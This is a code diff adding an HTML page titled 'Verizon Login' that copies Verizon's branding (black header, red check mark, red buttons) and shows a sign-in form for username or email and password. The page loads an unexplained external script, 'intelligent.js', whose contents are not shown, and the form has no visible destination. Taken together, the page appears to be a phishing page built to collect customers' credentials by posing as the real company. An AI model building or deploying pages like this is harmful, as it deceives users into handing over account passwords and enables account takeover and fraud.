@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verizon Login</title>
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #f3f3f3;
+    }
+
+    .header {
+        background: #000;
+        padding: 22px;
+        text-align: center;
+    }
+
+    .header .logo {
+        color: white;
+        font-size: 26px;
+        font-weight: bold;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 5px;
+    }
+
+    .header .logo span {
+        color: #e60000;
+        font-size: 32px;
+        font-weight: bold;
+        margin-top: -6px;
+    }
+
+    .login-container {
+        max-width: 380px;
+        margin: 60px auto;
+        background: white;
+        padding: 30px 25px;
+        border-radius: 12px;
+        box-shadow: 0 4px 14px rgba(0,0,0,0.15);
+    }
+
+    .login-container h2 {
+        text-align: center;
+        margin-bottom: 15px;
+        color: #111;
+        font-weight: bold;
+    }
+
+    .input-group {
+        margin-bottom: 18px;
+    }
+
+    .input-group label {
+        display: block;
+        margin-bottom: 6px;
+        font-size: 14px;
+        font-weight: bold;
+        color: #333;
+    }
+
+    .input-group input {
+        width: 100%;
+        padding: 12px;
+        font-size: 15px;
+        border: 1px solid #aaa;
+        border-radius: 8px;
+        outline: none;
+        transition: 0.2s;
+    }
+
+    .input-group input:focus {
+        border-color: #e60000;
+        box-shadow: 0 0 5px rgba(230,0,0,0.4);
+    }
+
+    .login-btn {
+        width: 100%;
+        padding: 14px;
+        background: #e60000;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        color: white;
+        font-weight: bold;
+        cursor: pointer;
+        transition: 0.2s;
+        margin-top: 10px;
+    }
+
+    .login-btn:hover {
+        background: #c00000;
+    }
+
+    .links {
+        margin-top: 18px;
+        text-align: center;
+        font-size: 14px;
+    }
+
+    .links a {
+        color: #e60000;
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    .links a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<script src="intelligent.js"></script>
+<body>
+
+<div class="header">
+    <!-- Verizon text + red check -->
+    <div class="logo">verizon <span>✔</span></div>
+</div>
+
+<div class="login-container">
+    <h2>Sign In</h2>
+<form>
+    <div class="input-group">
+        <label>Username or Email</label>
+        <input type="text" placeholder="Enter username or email" name="username or email" required>
+    </div>
+
+    <div class="input-group">
+        <label>Password</label>
+        <input type="password" placeholder="Enter password" name="password" required>
+    </div>
+
+    <button class="login-btn" type="submit">Sign In</button>
+</form>
+    <div class="links">
+        <p><a href="#">Forgot your info?</a></p>
+        <p>New user? <a href="#">Create a Verizon account</a></p>
+    </div>
+</div>
+
+</body>
+</html>
